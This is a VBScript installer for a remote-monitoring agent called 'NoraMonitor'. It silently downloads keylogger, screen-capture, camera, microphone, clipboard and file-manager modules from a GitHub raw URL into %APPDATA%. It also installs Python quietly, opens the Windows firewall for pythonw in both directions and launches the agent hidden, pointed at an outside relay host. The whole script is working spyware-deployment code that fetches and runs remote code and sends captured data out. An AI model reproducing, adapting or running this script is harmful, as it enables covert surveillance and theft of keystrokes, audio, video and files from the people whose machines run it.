Dim sh, fs, DIR, RAW

Set sh  = CreateObject("WScript.Shell")
Set fs  = CreateObject("Scripting.FileSystemObject")

DIR = sh.ExpandEnvironmentStrings("%APPDATA%") & "\NoraMonitor"
RAW = "https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"

' ── Create directories ────────────────────────────────────────────────────────
If Not fs.FolderExists(DIR)                 Then fs.CreateFolder DIR
If Not fs.FolderExists(DIR & "\templates")  Then fs.CreateFolder DIR & "\templates"
If Not fs.FolderExists(DIR & "\recordings") Then fs.CreateFolder DIR & "\recordings"

' ── Download files (binary-safe, no PowerShell) ───────────────────────────────
Dim files, f
files = Array("app.py","keylogger.py","screencap.py","controller.py","server.py", _
              "recorder.py","camera.py","clipboard_monitor.py","processes.py", _
              "relay_client.py","file_manager.py","microphone.py","windows_control.py","requirements.txt")

For Each f In files
    Download RAW & "/" & f, DIR & "\" & f
Next
Download RAW & "/templates/viewer.html", DIR & "\templates\viewer.html"

' ── Install Python if missing ─────────────────────────────────────────────────
If sh.Run("cmd /c python --version", 0, True) <> 0 Then
    Dim tmp : tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\pysetup.exe"
    Download "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", tmp
    sh.Run """" & tmp & """ /quiet InstallAllUsers=0 PrependPath=1", 0, True
End If

' ── Refresh PATH so newly installed Python is found ───────────────────────────
Dim sp, up
On Error Resume Next
sp = sh.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path")
up = sh.RegRead("HKEY_CURRENT_USER\Environment\Path")
On Error GoTo 0
sh.Environment("Process")("PATH") = sp & ";" & up

' ── Install dependencies ──────────────────────────────────────────────────────
sh.Run "cmd /c pip install -r """ & DIR & "\requirements.txt"" -q --no-warn-script-location", 0, True

' ── Allow Python through firewall (prevents popup) ───────────────────────────
Dim pyw
On Error Resume Next
Set ex = sh.Exec("cmd /c where pythonw")
Do While ex.Status = 0 : WScript.Sleep 100 : Loop
pyw = Trim(ex.StdOut.ReadLine())
On Error GoTo 0
If pyw <> "" Then
    sh.Run "cmd /c netsh advfirewall firewall add rule name=""Python Monitor"" dir=in action=allow program=""" & pyw & """ enable=yes profile=any", 0, True
    sh.Run "cmd /c netsh advfirewall firewall add rule name=""Python Monitor"" dir=out action=allow program=""" & pyw & """ enable=yes profile=any", 0, True
End If

' ── Launch agent (no console window) ─────────────────────────────────────────
sh.Environment("Process")("NORA_RELAY") = "https://mon.eclipselivecam.online"
sh.Run "cmd /c start """" /D """ & DIR & """ pythonw """ & DIR & "\app.py""", 0, False

' ── Helper: download any file without PowerShell ─────────────────────────────
Sub Download(url, dest)
    On Error Resume Next
    Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Dim st : Set st = CreateObject("ADODB.Stream")
        st.Open : st.Type = 1
        st.Write http.ResponseBody
        st.SaveToFile dest, 2
        st.Close
    End If
    On Error GoTo 0
End Sub
